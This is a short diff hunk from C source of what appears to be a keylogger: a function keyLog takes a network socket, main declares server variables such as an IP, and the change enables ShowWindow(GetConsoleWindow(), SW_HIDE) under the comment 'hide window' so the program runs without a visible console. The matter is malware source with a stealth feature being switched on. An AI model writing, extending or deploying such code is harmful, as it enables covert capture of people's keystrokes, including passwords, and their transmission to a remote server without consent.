@@ -32,7 +32,7 @@ int keyLog(SOCKET Socket)
 int main(int argc, char *args[])
 {
     // hide window
-    //	ShowWindow(GetConsoleWindow(), SW_HIDE);
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     // server variables
     char *ip;
